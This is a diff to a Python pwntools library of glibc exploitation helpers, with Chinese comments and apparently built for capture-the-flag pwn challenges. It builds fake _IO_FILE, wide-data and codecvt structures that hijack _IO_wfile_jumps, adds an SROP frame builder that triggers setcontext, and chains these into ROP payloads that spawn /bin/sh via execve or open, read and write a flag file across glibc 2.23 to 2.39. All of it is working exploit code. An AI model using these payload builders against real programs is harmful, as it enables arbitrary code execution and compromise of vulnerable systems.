@@ -96,6 +96,59 @@ def IOfinish(_IO_str_jumps, fun_addr, payload_addr = None, param = None):
     
     return payload
 
+def HOYJDQ(read_addr, ret_gadget, reg = {}):
+    '''
+        House of 一骑当千 : 通过setcontext触发srop
+        
+        参数:
+            read_addr: 一个可写的地址即可
+            ret_gadget: ret gadget
+            reg: 需要设置的寄存器, 默认不设置
+                 可选寄存器有: 
+                    rbx, rcx, rdx, rdi, rsi 
+                    r8, r9, r12, r13, r14, r15,
+                    rbp, rsp 
+                 
+        使用方法:
+            直接触发setcontext, rdi指向payload地址即可
+        
+        示例:
+            HOYJDQ(payload_addr, ret_gadget, {'rsp':123, 'rdi' : 123, 'rsi':456, 'rsi':789})
+    '''
+    # 默认寄存器值
+    registers = {
+        'rbx': 0, 'rcx': 0, 'rdx': 0, 'rdi': 0, 'rsi': 0,
+        'r8': 0, 'r9': 0, 'r12': 0, 'r13': 0, 'r14': 0, 'r15': 0,
+        'rbp': 0, 'rsp': 0
+    }
+    
+    # 更新用户指定的寄存器值
+    registers.update(reg)
+    
+    payload = flat({
+        0xE0: read_addr,    # 这里写入一个可读的地址
+        0x1C0: 0x0,         # 这里写入0
+        # 设置rcx
+        0xA8: ret_gadget,   # ret gadget
+        # SROP
+        0xA0: registers['rsp'],
+        0x80: registers['rbx'],
+        0x78: registers['rbp'],
+        0x48: registers['r12'],
+        0x50: registers['r13'],
+        0x58: registers['r14'],
+        0x60: registers['r15'],
+        
+        0x70: registers['rsi'],
+        0x68: registers['rdi'],
+        0x98: registers['rcx'],
+        0x28: registers['r8'],
+        0x30: registers['r9'],
+        0x88: registers['rdx'],
+        }, filler = b'\x00')
+    return payload
+
+
 def HOQSPP(_IO_obstack_jumps, payload_addr,  fun_addr, param = None):
     '''
         House of 琴瑟琵琶 : 攻击_IO_obstack_jumps_addr
@@ -267,7 +320,7 @@ HOA2underflow_libc2_27 = lambda _IO_wfile_jumps, payload_addr, fun, param = b' \
 def HOA3underflow(_IO_wfile_jumps, payload_addr, fun, param1_value_offset_8 = b'', param2_value = b'', param3_value = b'', param4 = 0xFFFFFFFFFFFFFFFF):
     '''
         HOA3的underflow攻击链
-        libc2.31~libc2.39
+        libc-2.30 <= glibc
         
         _IO_wfile_jumps: _IO_wfile_jumps地址
         payload_addr: payload将要写入的地址
@@ -286,102 +339,91 @@ def HOA3underflow(_IO_wfile_jumps, payload_addr, fun, param1_value_offset_8 = b'
     
     payload = flat({
         # fake_IO_FILE
-        0x0:0x8000,                         # fp->_flags = 0x8000
-        0x8:param3_value,                   # fp->_IO_read_ptr = param3_value
-        0x10:param4,                        # fp->_IO_read_end > fp->_IO_read_ptr (param4)
-        0x20:0,                             # fp->_IO_write_base = 0
-        0x28:1,                             # fp->_IO_write_ptr = 1
-        0x98:fake_codecvt,                  # fp->_codecvt = fake_codecvt
-        0xA0:fake_IO_wide_data,             # fp->_wide_data = fake_IO_wide_data
-        0xC0:0,                             # fp->_mode = 0
-        0xD8:_IO_wfile_jumps + 0x8,         # fp->vtable = _IO_wfile_jumps + 0x8
+        0x00 : 0x8000,                          # fp->_flags = 0x8000
+        0x08 : param3_value,                    # fp->_IO_read_ptr = param3_value
+        0x10 : param4,                          # fp->_IO_read_end > fp->_IO_read_ptr (param4)
+        0x20 : 0,                               # fp->_IO_write_base = 0
+        0x28 : 1,                               # fp->_IO_write_ptr = 1
+        0x98 : fake_codecvt,                    # fp->_codecvt = fake_codecvt
+        0xA0 : fake_IO_wide_data,               # fp->_wide_data = fake_IO_wide_data
+        0xC0 : 0,                               # fp->_mode = 0
+        0xD8 : _IO_wfile_jumps + 0x8,           # fp->vtable = _IO_wfile_jumps + 0x8
         
         # fake_IO_wide_data
-        0x30 + 0x0:0,                      # fake_IO_wide_data->_IO_read_ptr (>=fake_IO_wide_data->_IO_read_end)(被赋值)
-        0x30 + 0x8:0,                      # fake_IO_wide_data->_IO_read_end = 0
-        0x30 + 0x10:0,                     # fake_IO_wide_data->_IO_read_base 被赋值
-        0x30 + 0x30:param2_value,          # fake_IO_wide_data->_IO_buf_base (param2_value)
-        0x30 + 0x60:0,                     # fake_IO_wide_data->_IO_last_state 被赋值
+        0x30 + 0x00 : 0,                        # fake_IO_wide_data->_IO_read_ptr (>=fake_IO_wide_data->_IO_read_end)(被赋值)
+        0x30 + 0x08 : 0,                        # fake_IO_wide_data->_IO_read_end = 0
+        0x30 + 0x10 : 0,                        # fake_IO_wide_data->_IO_read_base 被赋值
+        0x30 + 0x30 : param2_value,             # fake_IO_wide_data->_IO_buf_base (param2_value)
+        0x30 + 0x60 : 0,                        # fake_IO_wide_data->_IO_last_state 被赋值
         
         # fake_codecvt
-        0xA8 + 0x0:fake_step,              # fake_codecvt->__cd_in.step = fake_step
-        0xA8 + 0x8:0,                      # fake_codecvt->__cd_in.step_data.__outbuf
-        0xA8 + 0x10:0,                     # fake_codecvt->__cd_in.step_data.__outbufend
-        0xA8 + 0x28:0,                     # fake_codecvt->__cd_in.step_data.__statep
+        0xA8 + 0x00 : fake_step,                # fake_codecvt->__cd_in.step = fake_step
+        0xA8 + 0x08 : 0,                        # fake_codecvt->__cd_in.step_data.__outbuf
+        0xA8 + 0x10 : 0,                        # fake_codecvt->__cd_in.step_data.__outbufend
+        0xA8 + 0x28 : 0,                        # fake_codecvt->__cd_in.step_data.__statep
         
         # fake_step
-        0xC0 + 0x0:0,                      # fake_step->__shlib_handle == NULL
-        0xC0 + 0x8:param1_value_offset_8,  # fake_step->__shlib_handle + 8 = param1_value_offset_8
-        0xC0 + 0x28:fun,                   # fake_step.__fct = fun
+        0xC0 + 0x00 : 0,                        # fake_step->__shlib_handle == NULL
+        0xC0 + 0x08 : param1_value_offset_8,    # fake_step->__shlib_handle + 8 = param1_value_offset_8
+        0xC0 + 0x28 : fun,                      # fake_step.__fct = fun
     }, filler = b'\x00')
     return payload
 
-
-def HOYJDQ(read_addr, ret_gadget, reg = {}):
+def HOA3underflow_libc2_27(_IO_wfile_jumps, payload_addr, fun, 
+                  param1_value = b'', param2_value = b'', param3 = 0, param4 = 0xFFFFFFFFFFFFFFFF):
     '''
-        House of 一骑当千 : 高版本libc(libc-2.31及其之后)通过setcontext触发srop
+        HOA3的underflow攻击链
+        libc-2.23 <= glibc <= libc-2.29
         
-        参数:
-            read_addr: 一个可写的地址即可
-            ret_gadget: ret gadget
-            reg: 需要设置的寄存器, 默认不设置
-                 可选寄存器有: 
-                    rbx, rcx, rdx, rdi, rsi 
-                    r8, r9, r12, r13, r14, r15,
-                    rbp, rsp 
-            
-            
-                 
-        使用方法:
-            直接触发setcontext, rdi指向payload地址即可
+        _IO_wfile_jumps: _IO_wfile_jumps地址
+        payload_addr: payload将要写入的地址
+        fun: 要调用的函数的地址
         
-        示例:
-            HOYJDQ(payload_addr, ret_gadget, {'rsp':123, 'rdi' : 123, 'rsi':456, 'rsi':789})
+        param1_value: 第一个参数指向的地址的值
+        param2_value: 第二个参数指向的地址的值
+        param3: 第三个参数
+        param4: 第四个参数
+        
+        注意 : 第四个参数必须大于第三个参数
     '''
-    # 默认寄存器值
-    registers = {
-        'rbx': 0, 'rcx': 0, 'rdx': 0, 'rdi': 0, 'rsi': 0,
-        'r8': 0, 'r9': 0, 'r12': 0, 'r13': 0, 'r14': 0, 'r15': 0,
-        'rbp': 0, 'rsp': 0
-    }
     
-    # 更新用户指定的寄存器值
-    registers.update(reg)
+    fake_IO_wide_data = payload_addr + 0x30
+    fake_codecvt = payload_addr + 0xC8
     
     payload = flat({
-        0xE0: read_addr,    # 这里写入一个可读的地址
-        0x1C0: 0x0,         # 这里写入0
-        # 设置rcx
-        0xA8: ret_gadget,   # ret gadget
-        # SROP
-        0xA0: registers['rsp'],
-        0x80: registers['rbx'],
-        0x78: registers['rbp'],
-        0x48: registers['r12'],
-        0x50: registers['r13'],
-        0x58: registers['r14'],
-        0x60: registers['r15'],
+        # fake_IO_FILE
+        0x00 : 0x8000,                  # fp->_flags = 0x8000
+        0x08 : param3,                  # fp->_IO_read_ptr = 0
+        0x10 : param4,                  # fp->_IO_read_end = 1
+        0x20 : 0,                       # fp->_IO_write_base = 0
+        0x28 : 1,                       # fp->_IO_write_ptr = 1
+        0x98 : fake_codecvt,            # fp->_codecvt = fake_codecvt
+        0xA0 : fake_IO_wide_data,       # fp->_wide_data = fake_IO_wide_data
+        0xC0 : 0,                       # fp->_mode = 0
+        0xD8 : _IO_wfile_jumps + 0x8,   # fp->vtable = _IO_wfile_jumps + 0x8
         
-        0x70: registers['rsi'],
-        0x68: registers['rdi'],
-        0x98: registers['rcx'],
-        0x28: registers['r8'],
-        0x30: registers['r9'],
-        0x88: registers['rdx'],
-        }, filler = b'\x00')
+        # fake_IO_wide_data
+        0x30 + 0x00 : 0,                # fake_IO_wide_data->_IO_read_ptr = 0, 被赋值
+        0x30 + 0x08 : 0,                # fake_IO_wide_data->_IO_read_end = 0
+        0x30 + 0x10 : 0,                # fake_IO_wide_data->_IO_read_base 被赋值
+        0x30 + 0x30 : 0,                # fp->_wide_data->_IO_buf_base 第六个参数
+        0x30 + 0x58 : param2_value,     # fake_IO_wide_data->_IO_state 第二个参数的值
+        0x30 + 0x60 : 0,                # fake_IO_wide_data->_IO_last_state 被赋值
+        
+        # fake_codecvt
+        0xC8 + 0x00 : param1_value,     # fake_codecvt 第一个参数的值
+        0xC8 + 0x18 : fun,              # fun
+        
+    }, filler = b'\x00')
     return payload
 
-
-def HOA3underflow_srop(_IO_wfile_jumps, setcontext_addr, ret_gadget, payload_addr, rop_addr, reg = {}):
+def HOA3underflow_srop(libc, payload_addr, rop_addr, reg = {}):
     '''
         HOA3的underflow攻击链就行srop攻击(需自己编写rop并提供rop地址)
-        libc-2.31 ~ libc-2.39
-        返回值长度为:0x288
-        
+        libc-2.23 <= glibc
+      
         参数:
-            _IO_wfile_jumps: _IO_wfile_jumps实际地址
-            setcontext_addr: setcontext函数的地址
-            ret_gadget: ret gadget的地址
+            libc: libc对象(必须设置base地址)
             payload_addr: payload将要写入的地址
             rop_addr: ROP链的地址
             reg: 详情见HOYJDQ函数的reg参数
@@ -390,58 +432,76 @@ def HOA3underflow_srop(_IO_wfile_jumps, setcontext_addr, ret_gadget, payload_add
     registers = reg.copy()
     registers['rsp'] = rop_addr
     
-    payload1 = HOA3underflow(_IO_wfile_jumps, payload_addr, setcontext_addr)
+    # 寻找必要的地址
+    _IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
+    setcontext = libc.sym['setcontext']
+    ret_gadget = next(libc.search(asm('ret'), executable = True))
+    
     payload2 = HOYJDQ(payload_addr, ret_gadget, registers)
-    payload = payload1 + payload2[0x30:]
+    if (get_libc_version(libc) <= 229):
+        payload1 = HOA3underflow_libc2_27(_IO_wfile_jumps, payload_addr, setcontext)
+        payload = payload1 + payload2[0x20:]
+    
+    else:
+        payload1 = HOA3underflow(_IO_wfile_jumps, payload_addr, setcontext)
+        payload = payload1 + payload2[0x30:]
+        
     return payload
+    
 
-def HOA3underflow_rop(_IO_wfile_jumps, setcontext_addr, ret_gadget, payload_addr, rop_chain, reg = {}):
+def HOA3underflow_rop(libc, payload_addr, rop_chain, reg = {}):
     '''
         HOA3的underflow攻击链就行rop攻击(需自己编写rop无需提供rop地址)
-        libc-2.31 ~ libc-2.39
-        
+        libc-2.23 <= glibc
+      
         参数:
-            _IO_wfile_jumps: _IO_wfile_jumps实际地址
-            setcontext_addr: setcontext函数的地址
-            ret_gadget: ret gadget的地址
+            libc: libc对象(必须设置base地址)
             payload_addr: payload将要写入的地址
             rop_chain: ROP链的内容
             reg: 详情见HOYJDQ函数的reg参数
     '''
-    payload = HOA3underflow_srop(_IO_wfile_jumps, setcontext_addr, ret_gadget, payload_addr, payload_addr + 0x288, reg)
-    if len(payload) != 0x288:
-        log.warning(f'payload长度不为0x288, 实际长度: {len(payload)}')
-        payload = HOA3underflow_srop(_IO_wfile_jumps, setcontext_addr, ret_gadget, payload_addr, payload_addr + len(payload), reg)
+    srop_len = 0x290 if get_libc_version(libc) <= 229 else 0x288
+    
+    payload = HOA3underflow_srop(libc, payload_addr, payload_addr + srop_len, reg)
+    if len(payload) != srop_len:
+        log.warning(f'payload长度不为{srop_len}, 实际长度: {len(payload)}')
+        payload = HOA3underflow_srop(libc, payload_addr, payload_addr + len(payload), reg)
         
     return payload + rop_chain
+    
 
 def HOA3underflow_execve(libc, payload_addr):
     '''
         HOA3的underflow攻击链执行execve("/bin/sh", 0, 0)
-        libc-2.31 ~ libc-2.39
-        
+        libc-2.23 <= glibc
+      
         参数:
             libc: libc对象(必须设置base地址)
             payload_addr: payload将要写入的地址
+            
+        2.30 <= libc         时payload长度为0x2b0
+        2.23 <= libc <= 2.29 时payload长度为0x2b8
     '''
     rop = ROP(libc)
     rop.execve(next(libc.search('/bin/sh')), 0)
-    return HOA3underflow_rop(libc.sym['_IO_wfile_jumps'], libc.sym['setcontext'], rop.find_gadget(['ret'])[0], payload_addr, rop.chain(),
-                             {'rdx':0})
-
+    return HOA3underflow_rop(libc, payload_addr, rop.chain(), {'rdx':0})
 
 def HOA3underflow_orw(libc, payload_addr, flag = b'flag'):
     '''
         HOA3的underflow攻击链执行orw
-        libc-2.31 ~ libc-2.39
-        
+        libc-2.23 <= glibc
+    
         参数:
             libc: libc对象(必须设置base地址)
             payload_addr: payload将要写入的地址
+            
+        2.30 <= libc         时payload长度为0x340
+        2.23 <= libc <= 2.29 时payload长度为0x338
     '''
-    rop = ROP(libc,  base=payload_addr + 0x288)
     
-    # 因为缺少gadget，所以需要自己编写rop
+    rop = ROP(libc,  base = payload_addr + (0x290 if get_libc_version(libc) <= 229 else 0x288))
+    
+    # 因为可能缺少设置rdx的gadget，所以需要使用syscall
     # rop.open(flag, 0)
     # rop.read(3, payload_addr, 0x100)
     # rop.write(1, payload_addr, 0x100)
@@ -458,6 +518,4 @@ def HOA3underflow_orw(libc, payload_addr, flag = b'flag'):
     rop.rax = constants.SYS_write
     rop.call(syscall, [1, payload_addr])
     
-    return HOA3underflow_rop(libc.sym['_IO_wfile_jumps'], libc.sym['setcontext'], ret, payload_addr, rop.chain(),
-                             {'rdx':0x100})
-
+    return HOA3underflow_rop(libc, payload_addr, rop.chain(), {'rdx':0x100})
